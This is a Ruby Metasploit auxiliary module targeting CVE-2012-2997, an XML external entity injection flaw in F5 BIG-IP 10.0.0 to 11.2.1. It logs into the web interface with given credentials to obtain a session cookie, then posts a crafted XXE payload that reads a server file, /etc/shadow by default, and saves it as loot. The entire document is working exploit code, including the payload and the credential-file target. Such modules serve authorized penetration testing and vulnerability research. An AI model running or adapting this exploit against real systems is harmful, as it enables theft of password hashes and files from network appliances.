##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'         => 'F5 BIG-IP XML External Entity Injection Vulnerability',
      'Description'  =>  %q{
          This module attempts to read a remote file from the server using a
        vulnerability in the way F5 BIG-IP handles XML files. The vulnerability requires
        an authenticated cookie so you must have some access to the web interface. F5
        BIG-IP versions from 10.0.0 to 11.2.1 are known to be vulnerable, see F5 page for
        specific versions. This module has not been verified, but should be ready for
        landing into rapid7/master if someone could help to confirm which module is working
        as expected.
      },
      'References'   =>
        [
          [ 'CVE', '2012-2997' ],
          [ 'OSVDB', '89447' ],
          [ 'BID', '57496' ],
          [ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130122-0_F5_BIG-IP_XML_External_Entity_Injection_v10.txt' ], # Original disclosure
          [ 'URL', 'http://support.f5.com/kb/en-us/solutions/public/14000/100/sol14138.html' ],
          [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/2144' ]
        ],
      'Author'       =>
        [
          'S. Viehbock',     # Vulnerability discovery
          'Thaddeus Bogner', # Metasploit module
          'Will Caput',      # Metasploit module
          'Trevor Hartman'  # Metasploit module
        ],
      'DefaultOptions' => { 'SSL' => true },
      'DisclosureDate' => 'Jan 22 2013',
      'License'      => MSF_LICENSE
    )

    register_options(
    [
      Opt::RPORT(443),
      OptString.new('LOGINURI', [true, 'Login URI to F5 BIG-IP', '/tmui/logmein.html?msgcode=2&']),
      OptString.new('TARGETURI', [true, 'Path to F5 BIG-IP', '/sam/admin/vpe2/public/php/server.php']),
      OptString.new('RFILE', [true, 'Remote File', '/etc/shadow']),
      OptString.new('USERNAME', [true, 'BIGIP Username', '']),
      OptString.new('PASSWORD', [true, 'BIGIP Password', ''])
    ], self.class)
  end

  def run_host(ip)
    # Check to see if a server even responds at the provided uri
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({
      'uri'     => uri,
      'method'  => 'GET'
    })

    if not res
      vprint_error("#{rhost}:#{rport} - Unable to connect")
      return
    end
    # Next login to the F5 with valid credentials and grab a valid cookie header.
    cookies = get_login_cookies(datastore['USERNAME'], datastore['PASSWORD'])
    if cookies.nil?
      vprint_error("#{rhost}:#{rport} - Failed to retrieve the session cookie")
      return
    end
    # With a valid cookie, attempt to do XML attack and access shadow file.
    access_file(ip, cookies)
  end

  def get_login_cookies(user, pass)
    vprint_status("Attempting login with '#{user}' : '#{pass}'")
    begin
      uri = normalize_uri(datastore['LOGINURI'])
      vprint_status("Acessing Login URI:'#{uri}'")
      res = send_request_cgi(
      {
        'uri'    => uri,
        'method' => 'POST',
        'vars_post' => {
          'username' => user,
          'passwd'   => pass
        }
      })
      if not res or res.code != 302 or res.headers['Location'] =~ /\/login\.jsp/
        print_status("FAILED LOGIN.")
        return nil
      end
      # Login succeeded and we need to look for the cookie
      if res.headers.include?('Set-Cookie') and res.headers['Set-Cookie'] =~ /BIGIPAuthCookie/
        print_good("SUCCESSFUL LOGIN AND RETRIEVED BIGIPAuthCookie.")
        return res.get_cookies
      else
        return nil
      end
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      vprint_error("HTTP Connection in get_login_cookies Failed, Aborting")
      return nil
    end
  end

  def access_file(rhost, cookies)
    uri = normalize_uri(target_uri.path)
    vprint_status("#{rhost}:#{rport} Connecting to F5 BIG-IP Interface")
    begin
      entity = Rex::Text.rand_text_alpha(rand(4) + 4)

      data =  "<?xml  version=\"1.0\" encoding='utf-8' ?>" + "\r\n"
      data << "<!DOCTYPE a [<!ENTITY #{entity} SYSTEM '#{datastore['RFILE']}'> ]>" + "\r\n"
      data << "<message><dialogueType>&#{entity};</dialogueType></message>" + "\r\n"

      res = send_request_cgi({
          'uri'      => uri,
          'method'   => 'POST',
          'ctype'    => 'text/xml; charset=UTF-8',
          'cookie'   => cookies,
          'data'     => data,
          })

      if not res # Check for empty result
        vprint_error("#{rhost}:#{rport} Empty Result.")
        return
      end

      if res.code == 302 # Should never happen, but check for bad login cookie
        vprint_error("Bad Cookie Provided.")
        return
      end

      if res.code == 200 # Good result, but still my not be vulnerable
        body = res.body
        if not body or body.empty?
          vprint_status("Retrieved empty file from #{rhost}:#{rport}")
          return
        end

        if body =~ /Bad request/ # Not Vulnerable
          vprint_error("#{rhost}:#{rport} not vulnerable.")
          return
        end

        if body =~ /generalError/ # Vulnerable unless patched.
          loot = ''
          doc = REXML::Document.new(body)
          doc.elements.each('message/messageBody/generalErrorText') do |e|
            # Remove the extra text returned.
            loot_node = e.get_text
            if loot_node # Check bacause could be nil
              # Give me the data between the single quotes
              #loot = loot_node.value.scan(/'([^']*)'/) # Bad with quoted loot
              loot = loot_node.value[38..-2]
              if loot.empty? # Probably a patched F5
                vprint_error("LOOT Empty.  F5 BIG-IP is Likely Patched")
                return
              end
            end
          end
          f = ::File.basename(datastore['RFILE'])
          path = store_loot('f5.bigip.file',
            'application/octet-stream',
            rhost,
            loot,
            f,
            datastore['RFILE']
          )
          print_status("#{rhost}:#{rport} F5 BIG-IP - #{datastore['RFILE']} saved in #{path}")
          return
        end
      end
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      vprint_error("HTTP Connection in access_file Failed, Aborting")
      return
    end
    vprint_error("#{rhost}:#{rport} Failed to retrieve file from #{rhost}:#{rport}")
  end
end
